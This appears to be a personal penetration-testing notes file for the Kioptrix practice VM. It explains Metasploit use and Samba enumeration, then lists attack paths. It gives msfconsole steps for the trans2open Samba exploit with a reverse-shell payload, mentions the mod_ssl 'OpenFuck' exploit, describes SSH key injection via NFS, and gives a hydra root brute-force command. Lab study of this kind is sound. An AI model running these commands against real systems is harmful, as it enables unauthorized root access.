@@ -1,0 +1,248 @@
+
+╔══════════════════════════════════════════════════════════════════╗
+║                                                                  ║
+║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ███╗  ██╗ ██████╗ ████╗  ║
+║   ██║ ██╔╝██╔══██╗██╔════╝██║ ██╔╝    ████╗ ██║██╔═══██╗╚══██╗ ║
+║   █████╔╝ ███████║██║     █████╔╝     ██╔██╗██║██║   ██║  ██╔╝ ║
+║   ██╔═██╗ ██╔══██║██║     ██╔═██╗     ██║╚████║██║   ██║ ██╔╝  ║
+║   ██║  ██╗██║  ██║╚██████╗██║  ██╗    ██║ ╚███║╚██████╔╝██████╗║
+║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═════╝║
+║                                                                  ║
+║   Target  →  192.168.1.184        Host  →  KIOPTRIX             ║
+║   OS      →  Linux 2.4.x RedHat   MAC   →  08:00:27:AF:60:FF   ║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝
+
+
+
+
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+▓                                                                 ▓
+▓   01 │ MSFCONSOLE                                               ▓
+▓                                                                 ▓
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+
+  Metasploit is the most widely used penetration testing framework
+  in the world. msfconsole is the interactive shell you use to
+  control it. You pick an exploit, set a target, and fire.
+
+
+  ── WHAT LIVES INSIDE METASPLOIT ──────────────────────────────
+
+    exploit/      Attacks a vulnerability to get code execution
+    auxiliary/    Scanners, fuzzers, sniffers — no payload needed
+    payload/      Code that runs on the target after exploitation
+    post/         Post-exploitation — runs after you have a shell
+    encoder/      Wraps payloads to try and bypass antivirus
+
+
+  ── BASIC WORKFLOW ─────────────────────────────────────────────
+
+  Every time you use msfconsole you follow this same order:
+
+  1.  Launch msfconsole
+  ┌─────────────────────────────────────────┐
+  │  $ msfconsole                           │
+  └─────────────────────────────────────────┘
+
+  2.  Search for the module you want
+  ┌─────────────────────────────────────────┐
+  │  msf6 > search mod_ssl                  │
+  │  msf6 > search trans2open               │
+  └─────────────────────────────────────────┘
+
+  3.  Select it
+  ┌─────────────────────────────────────────┐
+  │  msf6 > use exploit/linux/samba/trans2open│
+  └─────────────────────────────────────────┘
+
+  4.  See what options you need to fill in
+  ┌─────────────────────────────────────────┐
+  │  msf6 > show options                    │
+  └─────────────────────────────────────────┘
+
+  5.  Fill in the required options
+  ┌─────────────────────────────────────────┐
+  │  msf6 > set RHOSTS 192.168.1.184        │  ← target IP
+  │  msf6 > set PAYLOAD linux/x86/shell_reverse_tcp
+  │  msf6 > set LHOST 192.168.1.X          │  ← YOUR Kali IP
+  └─────────────────────────────────────────┘
+
+  6.  Fire
+  ┌─────────────────────────────────────────┐
+  │  msf6 > run                             │
+  └─────────────────────────────────────────┘
+
+  7.  Manage sessions after a successful exploit
+  ┌─────────────────────────────────────────┐
+  │  msf6 > sessions -l      ← list shells  │
+  │  msf6 > sessions -i 1    ← enter shell  │
+  └─────────────────────────────────────────┘
+
+  ╔═ TIP ══════════════════════════════════════════════════════╗
+  ║  Find your LHOST (Kali IP) by running:  ip a | grep 192   ║
+  ╚════════════════════════════════════════════════════════════╝
+
+
+
+
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+▓                                                                 ▓
+▓   02 │ SMB — SERVER MESSAGE BLOCK                               ▓
+▓                                                                 ▓
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+
+  SMB (Server Message Block) is a network protocol for sharing
+  files and printers between machines on the same network.
+  On Linux it runs as Samba — an open-source SMB implementation.
+  It listens on port 139 (old NetBIOS) or port 445 (modern).
+
+
+  ── WHAT THE NMAP SCAN SAYS ABOUT SMB ─────────────────────────
+
+  Here is the relevant output from our scan:
+
+  ┌─ nmap -T4 -p- -A 192.168.1.184 ──────────────────────────────┐
+  │                                                               │
+  │  139/tcp  open  netbios-ssn  Samba smbd (workgroup: JMYGROUP)│
+  │  nbstat: NetBIOS name: KIOPTRIX                               │
+  │  smb2-time: Protocol negotiation failed (SMB2)               │
+  │                                                               │
+  └───────────────────────────────────────────────────────────────┘
+
+  Breaking it down line by line:
+
+    139/tcp open
+      → Port 139 is open. SMB over NetBIOS is running and
+        accepting connections. This is our attack surface.
+
+    NetBIOS name: KIOPTRIX
+      → The hostname leaked automatically. Useful to know
+        who we are talking to and for some tools that need it.
+
+    Protocol negotiation failed (SMB2)
+      → The machine couldn't even speak SMB2. This means it
+        is running ancient SMB1 / Samba 2.x — extremely old
+        and full of critical unpatched vulnerabilities.
+
+    workgroup: JMYGROUP
+      → The Windows workgroup name. Useful for enum4linux
+        and confirms this is a very old setup.
+
+  ╔═ WARNING ══════════════════════════════════════════════════╗
+  ║  Port 445 is NOT open. SMB is only on 139.                 ║
+  ║  Some tools default to 445 — you may need to set -p 139   ║
+  ╚════════════════════════════════════════════════════════════╝
+
+
+  ── WHY OLD SAMBA IS SO DANGEROUS ─────────────────────────────
+
+    CVE-2003-0201  →  trans2open
+      Buffer overflow in Samba versions below 2.2.8.
+      Gives unauthenticated remote root — zero creds needed.
+
+    Null sessions
+      Old Samba allows anonymous login by default.
+      Attacker can list users, shares, and OS info for free.
+
+    Username enumeration
+      Samba leaks whether a username is valid on failed login.
+      Makes brute-forcing much easier — confirm real users first.
+
+
+  ── STEP 1 — ENUMERATE BEFORE YOU EXPLOIT ─────────────────────
+
+  List shares anonymously:
+  ┌─────────────────────────────────────────────────────────────┐
+  │  $ smbclient -L //192.168.1.184 -N                          │
+  │         -N means no password (anonymous login)              │
+  └─────────────────────────────────────────────────────────────┘
+
+  Full SMB enumeration — users, shares, OS, password policy:
+  ┌─────────────────────────────────────────────────────────────┐
+  │  $ enum4linux -a 192.168.1.184                              │
+  └─────────────────────────────────────────────────────────────┘
+
+  Query the NetBIOS name table:
+  ┌─────────────────────────────────────────────────────────────┐
+  │  $ nmblookup -A 192.168.1.184                               │
+  └─────────────────────────────────────────────────────────────┘
+
+  Map shares and their read/write permissions:
+  ┌─────────────────────────────────────────────────────────────┐
+  │  $ smbmap -H 192.168.1.184                                  │
+  └─────────────────────────────────────────────────────────────┘
+
+
+  ── STEP 2 — CONFIRM SAMBA VERSION ────────────────────────────
+
+  Use the Metasploit SMB scanner to get the exact version:
+  ┌─────────────────────────────────────────────────────────────┐
+  │  msf6 > use auxiliary/scanner/smb/smb_version              │
+  │  msf6 > set RHOSTS 192.168.1.184                           │
+  │  msf6 > run                                                 │
+  └─────────────────────────────────────────────────────────────┘
+
+  The output will print the exact Samba version.
+  If it is below 2.2.8 → go straight to Step 3.
+
+
+  ── STEP 3 — EXPLOIT WITH TRANS2OPEN ──────────────────────────
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │  msf6 > use exploit/linux/samba/trans2open                 │
+  │  msf6 > set RHOSTS 192.168.1.184                           │
+  │  msf6 > set PAYLOAD linux/x86/shell_reverse_tcp            │
+  │  msf6 > set LHOST <your-kali-ip>                           │
+  │  msf6 > run                                                 │
+  └─────────────────────────────────────────────────────────────┘
+
+  ╔═ TIP ══════════════════════════════════════════════════════╗
+  ║  trans2open sometimes needs 2-3 tries. Run it again if    ║
+  ║  the connection dies immediately after opening.           ║
+  ╚════════════════════════════════════════════════════════════╝
+
+
+
+
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+▓                                                                 ▓
+▓   03 │ ATTACK PRIORITY — from the nmap scan                     ▓
+▓                                                                 ▓
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+
+  #1  [HIGHEST]  mod_ssl / OpenFuck  →  port 443
+  ···············································
+    Vuln    : CVE-2002-0082
+    Service : Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b
+    Result  : Remote buffer overflow → direct root shell
+    How     : searchsploit mod_ssl  OR  msfconsole
+
+
+  #2  [HIGH]     Samba trans2open    →  port 139
+  ···············································
+    Vuln    : CVE-2003-0201
+    Service : Samba smbd (workgroup JMYGROUP, SMB1 only)
+    Result  : Unauthenticated remote root — no creds needed
+    How     : use exploit/linux/samba/trans2open
+
+
+  #3  [RECON]    RPC / NFS           →  port 111
+  ···············································
+    Service : rpcbind + status (port 32768)
+    Goal    : find exposed NFS shares
+    How     : rpcinfo -p 192.168.1.184
+              showmount -e 192.168.1.184
+    If win  : mount share, inject SSH key, get shell
+
+
+  #4  [LAST]     SSH brute force     →  port 22
+  ···············································
+    Service : OpenSSH 2.9p2 (SSHv1 supported)
+    How     : hydra -l root -P /usr/share/wordlists/rockyou.txt
+                     ssh://192.168.1.184
+
+
+══════════════════════════════════════════════════════════════════
+  notes.txt  |  target: KIOPTRIX 192.168.1.184
+══════════════════════════════════════════════════════════════════
